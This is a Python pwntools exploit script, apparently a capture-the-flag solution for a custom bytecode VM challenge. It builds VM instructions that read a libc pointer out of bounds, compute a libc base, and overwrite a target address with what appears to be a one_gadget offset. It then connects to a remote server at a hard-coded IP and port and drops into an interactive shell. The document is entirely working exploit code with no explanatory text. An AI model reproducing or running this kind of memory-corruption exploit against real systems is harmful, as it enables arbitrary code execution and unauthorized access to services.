#!/usr/bin/python

from pwn import *

def make_p64_to_r1(val):
    code = ""
    for i in range(8): 
        code += "000807"
        code += "08010701"    #r[1] <<= 8
        code += "00" + p64(val)[7-i].encode('hex') + "07"
        code += "01010701"  #r[1] += r[7]
    return code

def memcpy8_to_r2():
   code = ''
   for i in range(8):
        code += '09030105'  # r[5] = m[r[1]]
        code += '0d'
        code += '000004'
        code += '01050405'  # r[5] += r[4]
        code += '0d'
        code += '00' + chr(8).encode('hex') + "07"
        code += '08060706'  # r[6] <<= (i*8)
        code += '01060506' # r[6] += r[5]
        code += '000107'
        code += '02010701'  # r[1] -= 1
   code += '01020602'  # r[2] += r[6]
   return code 


def memcpy_to_mem():
    code = ''
    for i in range(8):
        code += "09050201"  # m[r[1]] = r[2]
        code += "000107"
        code += "01010701"  # r[1] += 1
        code += "000807"
        code += "07020702"
    return code

pay = "0d"
pay += make_p64_to_r1((-0x1eadb9)&0xffffffffffffffff)
pay += memcpy8_to_r2()
pay += make_p64_to_r1((0x875a0))
pay += "02020102"
pay += make_p64_to_r1(0xe6c81)  
pay += "01020102"
pay += make_p64_to_r1((-0x1ead80+0xa8)&0xffffffffffffffff)   # overwrite_offset # a8
pay += memcpy_to_mem()
#pay += make_p64_to_r1(0xdeadbeef)
#pay += "000000"
#pay += "005506"
pay += "03070707"
#pay += "09030909"

#-0x1ead80
print pay

s = remote("52.79.129.93", 1337)
print s.recv(4096)
pause()

s.sendline(pay)

s.interactive()
